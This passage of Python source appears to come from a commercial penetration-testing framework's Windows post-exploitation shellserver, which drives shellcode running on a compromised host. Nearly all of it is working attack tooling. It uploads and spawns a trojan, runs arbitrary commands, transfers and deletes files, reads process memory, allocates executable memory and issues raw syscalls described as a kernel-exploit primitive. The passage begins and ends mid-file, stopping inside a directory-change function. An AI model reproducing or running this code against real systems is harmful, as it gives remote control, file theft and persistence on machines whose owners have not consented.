    def uploadtrojan(self):
        didtrojan=0
        for file in testfiles:
            logging.debug("trying to create %s" % (file))
            newfile=self.lcreat(file)
            if sint32(newfile)==-1:
                continue
            logging.debug("Success")
            #otherwise, we were able to open the file! YAY!
            tFile=open(trojanfile,"r")
            alldata=tFile.read()
            tFile.close()
            logging.debug("Trying to write into that file")
            while alldata!="":
                self.write(newfile,alldata[:1000])
                alldata=alldata[1000:]

            logging.debug("Done writing, now closing file")
            #close our remote file
            self.close(newfile)
            logging.debug("Now spawning file")
            self.spawn(file)
            #self.spawn(file)
            self.log("Done spawning file!")
            didtrojan=1
            break

        if not didtrojan:
            self.log("Didn't do trojan...sorry")

        return

    def pwd(self):
        """
        calls getcwd()
        """
        ####TODO
        ret=self.getcwd()
        return ret

    def doprocesslisting(self):
        """
	Print a tree of the process listing. Like the pstree command on Unix.
	"""
        ret=self.processlist()
        return ret

    def tcpportscan(self,args):
        """ TCP Connect scan from the remote host.
        Args: network to scan, startport, endport
        """
        argsL=args.split(" ")
        tm = 150000
        if len(argsL) == 4:
            try:
                tm = int(argsL[3])
            except:
                tm = 150000

        return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]), timeout=tm)

    def upload(self,source,dest="",destfilename=None, sourceisbuffer=False ):
        """
        Upload a file to the remote host
        """

        if sourceisbuffer:
            #source is our upload buffer
            tFile=StringIO.StringIO(source)
        else:
            #source is the filename
            try:
                tFile=open(source,"rb")
                #alldata=tFile.read() bad idea
                #tFile.close()
            except (OSError, IOError), e:
                raise  NodeCommandError("Error reading input file: %s" % str(e))

        if dest:
            if dest.endswith('/'):
                dest = dest[:-1] + '\\'
            elif  not dest.endswith('\\'):
                dest = dest + '\\'

        if destfilename:
            destfile = destfilename
        else:
            # strip any leading path away
            self.log("[ii] Stripping path from: %s" % (source))
            destfile = dest + strip_leading_path(source)

        self.log("[ii] Trying to create %s" % (destfile))
        newfile = self.CreateFile(destfile,GENERIC_WRITE,FILE_SHARE_READ,None,
                                  CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL)
        if newfile < 0:
            raise NodeCommandError("Could not create remote file")

        #now write the data directly down the pipe
        self.log("[+] Writing to FD(0x%x)" % newfile)
        ret = self.writefiletofd(newfile, tFile)
        if ret == 0:
            # Avoid leaving empty/corrupted files around
            self.CloseHandle(newfile)
            ret = self.unlink(destfile)

            raise NodeCommandError("Error while writing file to remote end")

        self.log("[ii] File uploaded successfully")

        ret = self.CloseHandle(newfile)
        if sint32(ret) == -1:
            raise NodeCommandError("Error while trying to close remote file")

        tFile.close()
        return 1

    def download(self,source,dest="."):
        """
        downloads a file from the remote server
        """
        if not source:
            self.log("Invalid source for download(): Null")
            raise NodeCommandError("Couldn't open remote file NULL, sorry.")

        #clear a / off the front
        if unicode(source[0])==u"/":
            source=source[1:]

        infile=self.CreateFile(source,GENERIC_READ,FILE_SHARE_READ,None,
                               OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL)

        if infile<0:
            raise NodeCommandError("Couldn't open remote file %s, sorry."%source)

        if os.path.isdir(dest):
            dest=os.path.join(dest,source.replace("/","_").replace("\\","_"))

        (ret,dwFileAttributes,ftCreationTime,ftLastAccessTime,
         ftLastWriteTime,dwVolumeSerialNumber,nFileSizeHigh,nFileSizeLow,
         nNumberOfLinks,nFileIndexHigh,nFileIndexLow)=self.GetFileInformationByHandle(infile)

        if ret!=1:
            #self.log("Ret %s"%ret)
            self.CloseHandle(infile)
            raise NodeCommandError("GetFileInformation failed on file %s"%source)

        size=nFileSizeLow
        self.log("Downloading %s bytes"%size)

        outfile=open(dest,"wb")
        if outfile==None:
            raise NodeCommandError("Couldn't open local file %s"%dest)

        self.log( "infile = %8.8x"%infile)

        #read directly into a file...should use not that much ram
        self.readfilefromfd(infile,size,outfile)

        ret=self.CloseHandle(infile)
        if ret<0:
            self.log("Some kind of error closing fd %d"%infile)
        outfile.close() #close local file
        return "Saved data into %s"%(dest)

    def do_cd(self, dest):
        """
        Used from commandline shell.
        """
        return self.cd(dest)

    def cd(self, dest):
        """
        Called by the shellserver to change into a new directory
	"""
        devlog("win32","cd: dest(%s) = %r "%(type(dest),dest))
        if sint32(self.chdir(dest)) == -1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s"%(dest)

    def unlink(self, filename, error=False):
        """
        Called by the shellserver to delete files
        """
        vars={}
        vars["filename"]=filename
        code="""
        //start of code
        //_unlink doesn't always exist, so we use remove instead now
        #import "remote", "msvcrt.dll|remove" as "_unlink"
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"

        void main()
        {
            int i;
            i=_unlink(filename);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()

        if not ret:
            return "%s was unlinked."%filename
        else:
            if error:
                raise Exception('%s was not deleted' % filename)
            else:
                return "%s was not unlinked due to some kind of error."%filename


    def os_major_geq(self, major=6):
        code = """
        #import "remote", "ntdll.dll|RtlGetVersion" as "RtlGetVersion"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "int", "major" as "major"

        struct RTL_OSVERSIONINFOW {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            short szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            // it's possible there's 2 characters here, for padding? I hope not.
            char wProductType;
            char wReserved;
            int pad; //dunno why this is here. But it is.
        };

        int main(){
           int ret;
           int size;
           struct RTL_OSVERSIONINFOW osvi;

           ret = 0;
           size = 288; // sizeof(RTL_OSVERSIONINFOW) + 4 (for whatever reason)

           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;

           RtlGetVersion(&osvi);

           if (osvi.dwMajorVersion==major){
             ret = 1;
           }
           if (osvi.dwMajorVersion > major){
             ret = 1;
           }

           sendint(ret);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,{"major": major})
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret


    def os_producttype(self):
        code = """
        #import "remote", "kernel32.dll|GetVersionExA" as "GetVersionEx"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        struct OSVERSIONINFOEXA {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            char szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            char wProductType;
            char wReserved;
            int pad; //dunno why this is here. But it is.
        };

        int main(){
           int ret;
           int size;
           struct OSVERSIONINFOEXA osvi; // 156 bytes

           ret = 0;
           size = 156;

           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;

           GetVersionEx(&osvi);
           ret = osvi.wProductType;
           sendint(ret);

        }
        """

        self.clearfunctioncache()
        request=self.compile(code,{})
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret

    def MoveFileEx(self, filename, newfilename, flags):
        """
        Call kernel32!MoveFileExA
        If `newfilename' is None, a NULL pointer will be passed.
        """
        vars = {
            'FILENAME'    : filename,
            'NEWFILENAME' : newfilename,
            'FLAGS'       : flags,
        }

        code = """
        #import "remote", "kernel32.dll|MoveFileExA" as "MoveFileExA"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "string", "FILENAME" as "FILENAME"
        #import "string", "NEWFILENAME" as "NEWFILENAME"
        #import "int", "FLAGS" as "FLAGS"


        void main()
        {
            int i;
            i = MoveFileExA(FILENAME, NEWFILENAME, FLAGS);

            if (i == 0) {
                i = GetLastError();
            } else {
                i = 0;
            }

            sendint(i);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret

    def rmdir(self, filename):
        vars={}
        vars["filename"]=filename
        code="""
        //start of code
        #import "remote", "Kernel32.dll|RemoveDirectoryA" as "RemoveDirectory"
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"

        void main()
        {
            int i;
            i=RemoveDirectory(filename);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        if not ret:
            return "%s was removed."%filename
        else:
            return "%s was not removed due to some kind of error."%filename


    def dounlink(self,filename):
        """
        Delete a file ("unlink" it) on the remote machine
        """
        return self.unlink(filename)

    def dospawn(self,filename):

        #Using spawn() itself has a particular problem, which is that spawn() is actually a wrapper around
        #createprocessA that sets a few options for you - such as inherit handles. However, you
        #often want to set inherithandles to 0. Example: If you hack inetinfo.exe, and spawn calc.exe()
        #it will then have a handle to port 80, which means that when inetinfo.exe dies, you won't
        #be able to start a new one, since port 80 will be taken.
        #So we need to call CreateProcessA() manually here.
        logging.debug("SPAWNING: %s" % filename)
        # set DETACHED_PROCESS on spawn
        ret = self.CreateProcessA(filename,inherithandles=0, dwCreationFlags=0x00000008)
        if ret:
            return "%s was spawned."%(filename)
        else:
            return "%s was not spawned due to some kind of error (%d)."%(filename,ret)


    def runcommand(self,command):
        """
        Runs a command via popen
        """
        data=""
        data=self.popen2(command)


        return data

    def do_exitthread(self,exitcode):
        """Exit Thread"""
        ret=self.ExitThread(exitcode)
        self.disconnect()
        return ret

    def runexitprocess(self):
        """Exit the process"""
        self.exit(1)
        return "Exited the process"

    def callzero(self):
        """call zero"""
        self.shutdown()

    def shutdown(self):
        """
        close the socket
        This will cause the remote server to cause an exception
        """
        logging.debug("CALLING 0")
        #call 0 to cause an exception
        self.sendrequest(intel_order(0))
        #close connection
        self.connection.close()
        return

    def malloc(self, size):
        """
        Allocates data on the host
        """
        vars={}
        vars["size"]=size

        code="""
        //start of code
        #import "local","sendint" as "sendint"
        #import "int", "size" as "size"
        #import "local", "malloc" as "malloc"

        void main()
        {
           char *p;
           p=malloc(size);
           sendint(p);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret


    def RawSyscall(self, arg1, arg2):
        """
        Used for GDIWrite4
        """
        vars={}
        vars["arg1"]=arg1
        vars["arg2"]=arg2

        code="""
        //start of code

        #import "int", "arg1" as "arg1"
        #import "int", "arg2" as "arg2"
        #import "local", "rawsyscall" as "rawsyscall"
        #import "local","sendint" as "sendint"
        #import "local","debug" as "debug"
        void main()
        {
           int ret;
           //debug();
           ret=rawsyscall(arg1, arg2);
           sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret


    def free(self, addy):
        """
        Free data on the host
        Don't call me twice - or you run into
        the typical problems.
        """
        vars={}
        vars["addy"]=addy

        code="""
        //start of code

        #import "int", "addy" as "addy"
        #import "local", "malloc" as "malloc"

        void main()
        {
           free(addy);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
        return

    def getlocale(self):
        """
	Gets the codepage of this CANVAS Win32 Node.
        This is important for hacking machines that are not in English.

        References:

        http://msdn.microsoft.com/en-us/library/dd318107(VS.85).aspx
        http://msdn.microsoft.com/en-us/library/dd373814(VS.85).aspx
	"""
        variables={}

        code="""
        #import "remote", "kernel32.dll|GetLocaleInfoA" as "GetLocaleInfoA"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"


        void main() {
          int ret;
          char outbuf[5000];
          //LOCALE_USER_DEFAULT = 0x400
          //LOCALE_NAME_USER_DEFAULT = 0 ?
          //LOCALE_SISO3166CTRYNAME = 0x5A
          //LOCALE_SISO639LANGNAME = 0x59
          //LOCALE_IDEFAULTANSICODEPAGE 0x1004
          //LOCALE_IDEFAULTCODEPAGE 11 //OEM code page (more useful)
          ret=GetLocaleInfoA(0x400,0x59,outbuf,4999);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }

          ret=GetLocaleInfoA(0x400,0x5A,outbuf,4999);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }

          ret=GetLocaleInfoA(0x400,11,outbuf,4999);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,variables)
        self.sendrequest(request)

        langname=""
        countryname=""
        codepage=""
        ret=self.readint()
        retbuffer=""
        final=""
        if ret:
            retbuffer=self.readstring()
            final+=retbuffer
            langname=retbuffer
        else:
            self.log("Could not get locale LANGNAME!")

        ret=self.readint()
        retbuffer=""
        if ret:
            retbuffer=self.readstring()
            final+="_"+retbuffer
            countryname=retbuffer
        else:
            self.log("Could not get locale COUNTRYNAME!")

        ret=self.readint()
        retbuffer=""
        if ret:
            retbuffer=self.readstring()
            #self.log("Codepage: %s"%retbuffer)
            codepage=retbuffer
        else:
            self.log("Could not get locale Codepage!")

        self.leave()
        return (langname,countryname,codepage)

    def IsWow64Process(self, pid=None):
        """
        Returns True if we are a 32 bit process on a 64 bit platform
	http://msdn.microsoft.com/en-us/library/ms684139(VS.85).aspx

        If PID = None, check current process otherwise process with PID.
        An Exception will be raised in the 2nd case, if OpenProcess fails
        on target PID.
	"""
        vars = {}

        if pid is None:
            # Use current PID
            code = """
            #import "remote", "kernel32.dll|IsWow64Process" as "IsWow64Process"
            #import "remote", "kernel32.dll|GetCurrentProcess" as "GetCurrentProcess"

            #import "local", "sendint" as "sendint"
            void main()
            {
                int i;
                int ret;
                ret = IsWow64Process(GetCurrentProcess(), &i);
                //ret will be 0 if this fails. Not sure WHEN it would fail though?
                sendint(i);
            }
            """
            self.clearfunctioncache()
            request = self.compile(code,vars)
            self.sendrequest(request)
            ret = self.readint() #true or false
            self.leave()
            if ret:
                return True
            return False

        # Get a handle to process with target PID and query that
        vars['PID'] = pid

        code = """
        #import "remote", "kernel32.dll|IsWow64Process" as "IsWow64Process"
        #import "remote", "kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "local", "sendint" as "sendint"
        #import "int",    "PID" as "PID"

        void main()
        {
            int i;
            int ret;
            int pHandle;

            // PROCESS_QUERY_INFORMATION needs to be set
            pHandle = OpenProcess(0x0400, 0, PID);

            if (pHandle == 0) {
                sendint(0);
                return;
            }

            sendint(1);

            ret = IsWow64Process(pHandle, &i);
            ret = CloseHandle(pHandle);
            sendint(i);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:
            self.log('OpenProcess error, aborting..')
            self.leave()
            raise Exception('OpenProcess error')

        ret = self.readint()
        self.leave()
        if ret: return True
        return False

    def create_thread_ex_check(self):
        """
        Return True if NtCreateThreadEx is available.
        False otherwise.
        """
        code = """
        #import "remote", "kernel32.dll|GetModuleHandleA" as "GetModuleHandleA"
        #import "remote", "kernel32.dll|GetProcAddress" as "GetProcAddress"
        #import "local", "sendint" as "sendint"

        void main()
        {
            if (GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")) {
                sendint(1);
            } else {
                sendint(0);
            }

            return;
        }
        """

        return True if self.runCode(code, {}) == 1 else False


    def localize_string(self, instr):
        """
	Make the string unicode if at all possible!
        For various information about encodings:
        http://docs.python.org/library/codecs.html#encodings-and-unicode
	"""
        devlog("win32" "win32MosdefShellserver localize_string(): Raw string: %s"%repr(instr))
        if not self.locale:
            devlog("win32", "No locale found in localize_string()")
            return instr

        if len(self.locale)!=3:
            devlog("win32","self.locale seems munged: %s"%repr(self.locale))
            return instr

        #first try codepage
        from libs.unicode_utils import alias_mappings
        codepage=self.locale[2]
        if codepage and codepage in alias_mappings.keys():
            #try codepage translation (most likely to be correct)
            try:
                ret=instr.decode(alias_mappings[codepage])
                devlog("win32", "Decoded instring using %s"%codepage)
                return ret
            except:
                devlog("win32", "Failed to decode lang %s using codec %s"%(self.locale, codepage))
                #this is very strange

        devlog("win32", "Not using codepage translation directly...")
        ret=instr
        localename=self.locale[0]+"_"+self.locale[1]
        mappings={"zh_TW":["big5hkscs","big5","cp950"],
                  "ko_KR":["cp949","euc_kr","iso2022_jp_2","iso2022_kr","johab"],
                  }
        mappingList=mappings.get(localename,[])
        if not mappingList:
            devlog("win32","We don't have a built-in localization for locale: %s"%repr(self.locale))


        for mapping in (mappingList+["utf_8","ascii"]):
            try:
                ret=instr.decode(mapping)
            except:
                devlog("win32", "Failed to decode lang %s using codec %s"%(localename, mapping))
                devlog("win32" "Raw string: %s"%instr)
                continue
            devlog("win32", "Decoded instring using codepage %s"%mapping)
            break

        return ret

    def memread(self, address, size):
        """
        read a buffer from memory back to us here in Python-land
        If you give it the wrong address, you're looking at access violation problems.
        """
        vars={}
        vars["address"]=address
        vars["size"]=size

        code="""
        //start of code
        #import "local","memcpy" as "memcpy"
        #import "local","sendint" as "sendint"
        #import "int", "address" as "address"
        #import "int", "size" as "size"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"

        void main()
        {
           char *p;
           p=malloc(size);
           memcpy(p, address, size);
           senddata2self(p, size);
           free(p);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        data=self.readblock()
        self.leave()
        return data


    def MapViewOfFile(self, handle, access=None, offsethigh=0, offsetlow=0, numberofbytes=0):
        """
        MapViewOfFile
        You can't close these with CloseHandle
        You need to use UnmapViewOfFile
        """

        if access==None:
            access=FILE_MAP_ALL_ACCESS
        vars={}
        vars["handle"]=handle
        vars["access"]=access
        vars["offsethigh"]=offsethigh
        vars["offsetlow"]=offsetlow
        vars["numberofbytes"]=numberofbytes

        code="""
        //start of code
        #import "remote","kernel32.dll|MapViewOfFile" as "MapViewOfFile"
        #import "local","sendint" as "sendint"
        #import "int", "handle" as "handle"
        #import "int", "access" as "access"
        #import "int", "offsethigh" as "offsethigh"
        #import "int", "offsetlow" as "offsetlow"
        #import "int", "numberofbytes" as "numberofbytes"

        void main()
        {
           int ret;

           ret=MapViewOfFile(handle,access,offsethigh,offsetlow,numberofbytes);
           sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def UnmapViewOfFile(self, handle):
        """
        Close handles opened with MapViewOfFile
        """
        vars={}
        vars["handle"]=handle

        code="""
        //start of code
        #import "remote","kernel32.dll|UnmapViewOfFile" as "UnmapViewOfFile"
        #import "local","sendint" as "sendint"
        #import "int", "handle" as "handle"

        void main()
        {
           int ret;

           ret=UnmapViewOfFile(handle);
           sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def QuerySection(self, handle, informationlength=16, informationclass=0):
        """
        ntdll has this function:
        ZwQuerySection (
        IN HANDLE SectionHandle,
        IN SECTION_INFORMATION_CLASS SectionInformationClass,
        OUT PVOID SectionInformation,
        IN ULONG SectionInformationLength,
        OUT PULONG ResultLength OPTIONAL
        );
        """
        vars={}
        vars["handle"]=handle
        vars["informationclass"]=informationclass
        vars["informationlength"]=informationlength
        #self.log("Handle: %x Class: %x Information length: %d"%(handle, informationclass, informationlength))
        code="""
        //start of code
        #import "remote","ntdll.dll|ZwQuerySection" as "QuerySection"
        #import "local","sendint" as "sendint"
        #import "local","senddata2self" as "senddata2self"
        #import "int", "handle" as "handle"
        #import "int", "informationclass" as "informationclass"
        #import "int", "informationlength" as "informationlength"


        void main()
        {
           int ret;
           char buf[LENGTH];
           char *p;
           p=buf;
           ret=QuerySection(handle, informationclass, p, informationlength, 0);
           sendint(ret);
           senddata2self(p, LENGTH);

        }
        """.replace("LENGTH",str(informationlength))
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        #self.log("QuerySection returned: %x -> %x"%(ret,sint32(ret)))
        ret=sint32(ret)
        val=None
        if True:
            #self.log("Reading section data from remote server")
            val=self.readblock()
            #self.log("Read section data: %d"%len(val))
        self.leave()
        return ret, val



    def CreateSolidBrush(self, color):
        """
        Creates a GDI32 brush in a particular color
        Useful for drawing.
        """
        vars={}
        vars["color"]=color

        code="""
        //start of code
        #import "remote","gdi32.dll|CreateSolidBrush" as "CreateSolidBrush"
        #import "local","sendint" as "sendint"
        #import "int", "color" as "color"

        void main()
        {
           int ret;

           ret=CreateSolidBrush(color);
           sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def NtAllocateVirtualMemory(self, mapaddress, process=-1, size=0x1000, AllocType=None, ProtectionType=None):
        """
        Call NtAllocateVirtualMemory
        process of -1 is "current process pseudohandle"
        """
        if mapaddress==0:
            mapaddress=1

        if AllocType==None:
            AllocType=MEM_COMMIT|MEM_RESERVE

        if ProtectionType==None:
            ProtectionType=PAGE_EXECUTE_READWRITE

        vars={}
        vars["process"]=process
        vars["size"]=size
        vars["mapaddress"]=mapaddress
        vars["alloctype"]=AllocType
        vars["protecttype"]=ProtectionType

        code="""
        //start of code
        #import "remote", "ntdll.dll|NtAllocateVirtualMemory" as "NtAllocateVirtualMemory"
        #import "local","sendint" as "sendint"
        #import "int", "mapaddress" as "mapaddress"
        #import "int", "size" as "size"
        #import "int", "alloctype" as "alloctype"
        #import "int", "protecttype" as "protecttype"
        #import "int", "process" as "process"

        void main()
        {
            int i;
            int baseaddr;
            int regionsize;
            regionsize=size;
            baseaddr=mapaddress;

            i=NtAllocateVirtualMemory(process, &baseaddr, 0, &regionsize, alloctype, protecttype);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    #################################################################################################

    # added bool flag for more sendrequest control
    def sendrequest(self,request):
        """
        sends a request to the remote shellcode
        """
        devlog('shellserver::sendrequest', "Sending Request")
        request=self.order(len(request))+request
        #print "R: "+prettyprint(request)
        #print "XXX A"
        self.enter()
        #print "XXX B"
        self.writebuf(request)
        #print "XXX C"
        devlog('shellserver::sendrequest', "Done sending request")

        return

    ##################################################################################################
    #Shellcode functions below
    def close(self,fd):
        vars={}
        vars["fdtoclose"]=fd

        code="""
            //start of code
            #import "remote","ws2_32.dll|closesocket" as "closesocket"
            #import "int","fdtoclose" as "fdtoclose"
            #import "local","sendint" as "sendint"

            void main()
            {
                int i;
                i=closesocket(fdtoclose);
                sendint(i);
            }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret


    def open(self,filename,flags,mode=MODE_ALL):
        vars={}
        vars["filename"]=filename
        vars["flags"]=flags
        vars["mode"]=mode

        code="""
        //start of code
        #import "local","open" as "open"
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"
        #import "int","flags" as "flags"
        #import "int","mode" as "mode"

        void main()
        {
            int i;
            i=open(filename,flags,mode);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def GetFileInformationByHandle(self,handle):
        """
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/getfileinformationbyhandle.asp
        The FILETIME data structure is a 64-bit value representing the number of 100-nanosecond intervals since January 1, 1601.
        """
        vars={}
        vars["handle"]=handle
        code="""
        #import "local","sendint" as "sendint"
        #import "remote","kernel32.dll|GetFileInformationByHandle" as "GetFileInformationByHandle"
        #import "int","handle" as "handle"

        struct FILETIME {
           int dwLowDateTime;
           int dwHighDateTime;
        };

        struct BY_HANDLE_FILE_INFORMATION
        {
        int    dwFileAttributes;
        struct FILETIME ftCreationTime;
        struct FILETIME ftLastAccessTime;
        struct FILETIME ftLastWriteTime;
        int    dwVolumeSerialNumber;
        int    nFileSizeHigh;
        int    nFileSizeLow;
        int    nNumberOfLinks;
        int    nFileIndexHigh;
        int    nFileIndexLow;
        };

        void sendFILETIME(struct FILETIME *ft) {
           sendint(ft->dwLowDateTime);
           sendint(ft->dwHighDateTime);
        }

        void main()
        {
          int i;
          struct BY_HANDLE_FILE_INFORMATION fi;

          i=GetFileInformationByHandle(handle,&fi);
          sendint(i);
          sendint(fi.dwFileAttributes);
          sendFILETIME(&fi.ftCreationTime);
          sendFILETIME(&fi.ftLastAccessTime);
          sendFILETIME(&fi.ftLastWriteTime);
          sendint(fi.dwVolumeSerialNumber);
          sendint(fi.nFileSizeHigh);
          sendint(fi.nFileSizeLow);
          sendint(fi.nNumberOfLinks);
          sendint(fi.nFileIndexHigh);
          sendint(fi.nFileIndexLow);

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        dwFileAttributes=self.readint()
        ftCreationTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
        ftLastAccessTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
        ftLastWriteTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
        dwVolumeSerialNumber=self.readint()
        nFileSizeHigh=self.readint()
        nFileSizeLow=self.readint()
        nNumberOfLinks=self.readint()
        nFileIndexHigh=self.readint()
        nFileIndexLow=self.readint()
        self.leave()

        return (ret,dwFileAttributes,ftCreationTime,ftLastAccessTime,
                ftLastWriteTime,dwVolumeSerialNumber,nFileSizeHigh,nFileSizeLow,
                nNumberOfLinks,nFileIndexHigh,nFileIndexLow)

    def CreateFile(self,filename,access,sharemode,security,creationdisposition,flags):
        """
        This returns -1 on failure. Currently we don't return errno

        http://www.cs.rpi.edu/courses/fall01/os/CreateFile.html
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/readfile.asp
        """

        if security == None: security=0
        do_unicode = False

        if isinstance(filename, unicode):
            filename   = filename.encode('UTF-16LE')
            do_unicode = True

        vars={}
        vars["filename"]            = filename
        vars["flags"]               = flags
        vars["sharemode"]           = sharemode
        vars["templatefile"]        = 0
        vars["security"]            = security
        vars["access"]              = access
        vars["creationdisposition"] = creationdisposition

        code = """
        //start of code
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"
        #import "int","flags" as "flags"
        #import "int","sharemode" as "sharemode"
        #import "int","access" as "access"
        #import "int","creationdisposition" as "creationdisposition"
        #import "int","templatefile" as "templatefile"
        #import "int","security" as "security"

        // #import "local","debug" as "debug"

        void main()
        {
            int i;
            // debug();
            i=CreateFile(filename,access,sharemode,security,creationdisposition,flags,templatefile);
            sendint(i);
        }
        """

        if do_unicode:
            code = """#import "remote","kernel32.dll|CreateFileW" as "CreateFile" """ + "\n" + code
        else:
            code = """#import "remote","kernel32.dll|CreateFileA" as "CreateFile" """ + "\n" + code

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        self.leave()
        return ret

    def SetNamedPipeHandleState(self, fd, mode=None, maxbytes=None,maxtime=None):

        if mode==None:
            pass

        vars={}
        vars["fd"]=fd
        vars["mode"]=mode


        code="""
        //start of code
        #import "remote","kernel32.dll|SetNamedPipeHandleState" as "SetNamedPipeHandleState"
        #import "local","sendint" as "sendint"
        #import "int", "fd" as "fd"
        #import "int", "mode" as "mode"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        void main()
        {
            int ret;
            int error;
            char * outbuf;
            int dwPipeMode;

            dwPipeMode=mode;

            ret=SetNamedPipeHandleState(fd,&dwPipeMode,0,0);
            error=GetLastError();
            sendint(ret);
            sendint(error);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        outbuf=""
        devlog("SetNamedPipeHandleState returned %d"%ret)
        error=self.readint()
        self.leave()
        return ret,error

    def TransactNamedPipe(self, fd, inbuf, outbufsize=2000,overlapped=None):
        if overlapped==None:
            overlapped=0

        vars={}
        vars["fd"]=fd
        vars["inbuf"]=inbuf
        vars["overlapped"]=overlapped
        vars["inbufsize"]=len(inbuf)
        vars["outbufsize"]=outbufsize

        code="""
        //start of code
        #import "remote","kernel32.dll|TransactNamedPipe" as "TransactNamedPipe"
        #import "local","sendint" as "sendint"
        #import "string","inbuf" as "inbuf"
        #import "int", "fd" as "fd"
        #import "int","inbufsize" as "inbufsize"
        #import "int","outbufsize" as "outbufsize"
        #import "int","overlapped" as "overlapped"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        void main()
        {
            int ret;
            int error;
            char * outbuf;
            int bytesread;

            outbuf=malloc(outbufsize);
            ret=TransactNamedPipe(fd,inbuf,inbufsize,outbuf,outbufsize,&bytesread,overlapped);
            error=GetLastError();
            sendint(ret);
            if (ret!=0) {
                senddata2self(outbuf,bytesread);
            } else {
                sendint(error);
            }
            free(outbuf);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        outbuf=""
        logging.debug("TransactNamedPipe returned %d" % ret)
        if ret!=0:
            outbuf=self.readblock()
        else:
            outbuf=sint32(self.readint())
            devlog("Error: %x (e6 is bad pipe, e9 is no process on pipe e7 is all pipe instances busy)"%outbuf)
        self.leave()
        return ret,outbuf

    def chdir(self, directory):
        if type(directory)==type(""):
            devlog("win32","Using ascii chdir")
            return self.chdirA(directory)
        elif type(directory)==type(u''):
            #we are unicode
            return self.chdirW(directory)
        else:
            devlog("win32", "Unknown type %s for chdir!"%type(directory))
        return -1

    def chdirW(self, directory):
        """
	Unicode supporting change of working directory
        inputs: the directory to chdir into
        outputs: returns -1 on failure, otherwise 0
	"""
        devlog("win32","Changing into unicode directory %s"%directory)
